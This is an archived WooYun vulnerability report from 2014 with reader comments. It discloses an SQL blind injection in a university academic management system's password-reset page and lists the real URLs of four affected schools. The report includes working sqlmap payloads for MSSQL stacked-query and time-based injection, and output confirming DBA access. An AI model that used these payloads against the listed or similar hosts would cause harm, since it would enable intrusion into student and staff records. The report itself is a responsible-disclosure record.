{"id": 50418, "wybug_id": "wooyun-2014-077891", "wybug_title": "某教务管理系统SQL盲注一枚", "wybug_corp": "长春凌展教务管理系统", "wybug_author": "1c3z", "wybug_date": "2014-09-30 17:07", "wybug_open_date": "2014-12-26 17:08", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-05：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-26：\t细节向公众公开  简要描述： SQL盲注！涉及到多家学校的教务系统 详细说明：  注入点：teachweb/WebFormResetPassword.aspx实例：安徽工贸职业技术学院 http://60.171.18.27/teachweb/WebFormResetPassword.aspx吉林农业大学 http://202.198.0.40:7925/teachweb/WebFormResetPassword.aspx沈阳大学 http://sdjw.syu.edu.cn/WebFormResetPassword.aspx南昌航空大学 http://jwc.nchu.edu.cn/teachweb/WebFormResetPassword.aspx由于盲注太慢，基本就是点到为止下面是对南昌航空大学的注入过程判断注入类型\n\n上SQLMAP\n\n成功跑出数据库名点到为止！！   漏洞证明：  权限判断为DBA\nPlace: POSTParameter: UserName    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: __VIEWSTATE=dDwtMTQ5NzM1MTQ0Mjt0PDtsPGk8MT47PjtsPHQ8O2w8aTwzPjtpPDU+Oz47bDx0PHA8O3A8bDxPbkNsaWNrOz47bDxyZXR1cm4gY2hlY2tJc051bGwoKTs+Pj47Oz47dDxwPHA8bDxUZXh0Oz47bDzlj6rmnInlrabnlJ/lkozmlZnluIjmiY3og73ph43orr7lr4bnoIHvvIE7Pj47Pjs7Pjs+Pjs+Pjs+C19bfxGH4LDi8AqsMyWklhMm0cw=&role=student&UserName=1'); WAITFOR DELAY '0:0:5'--&BtnResetPassword=%D6%D8%C9%E8%C3%DC%C2%EB    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: __VIEWSTATE=dDwtMTQ5NzM1MTQ0Mjt0PDtsPGk8MT47PjtsPHQ8O2w8aTwzPjtpPDU+Oz47bDx0PHA8O3A8bDxPbkNsaWNrOz47bDxyZXR1cm4gY2hlY2tJc051bGwoKTs+Pj47Oz47dDxwPHA8bDxUZXh0Oz47bDzlj6rmnInlrabnlJ/lkozmlZnluIjmiY3og73ph43orr7lr4bnoIHvvIE7Pj47Pjs7Pjs+Pjs+Pjs+C19bfxGH4LDi8AqsMyWklhMm0cw=&role=student&UserName=1') WAITFOR DELAY '0:0:5'--&BtnResetPassword=%D6%D8%C9%E8%C3%DC%C2%EB---[10:41:19] [INFO] testing Microsoft SQL Server[10:41:19] [INFO] confirming Microsoft SQL Server[10:41:19] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 1.1.4322back-end DBMS: Microsoft SQL Server 2000[10:41:19] [INFO] testing if current user is DBAdo you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n] Ycurrent user is DBA:    True\n   修复方案：  把这个文件删除吧，改密码直接到学校教务处人工改吧！！求高RANKPS：估计厂商都找不到了，南昌航空大学注册成为了厂商！！！   版权声明：转载请注明来源 1c3z@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-12-26 17:08 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-20 05:05 |    \t\twellsun \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | www.wellsun.com)\t\t \n  @ 1c3z 对这套系统有兴趣，群主加教务系统群交流：Q:310068074 时候备注：凌展    \n     2015-01-21 17:51 |    \t\tF0rm \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | )\t\t \n  这套系统貌似用的挺少的，可以一起交流    \n     2015-01-29 18:19 |    \t\t1c3z \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:29        | 我读书少，你可别骗我！！！)\t\t \n  @F0rm 想交流什么？    \n     2015-01-31 17:57 |    \t\tF0rm \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | )\t\t \n  @1c3z  就是交流一下这个系统的洞    \n     2015-02-04 16:06 |    \t\t1c3z \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:29        | 我读书少，你可别骗我！！！)\t\t \n  @F0rm 没有了。。。只发现了这个！    \n     2015-02-04 18:10 |    \t\tF0rm \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | )\t\t \n  @1c3z 这个注入好慢。。这教务系统默认还有个接口能执行命令    \n     2015-02-10 14:09 |    \t\t1c3z \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:29        | 我读书少，你可别骗我！！！)\t\t \n  @F0rm 盲注嘛，肯定慢。。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}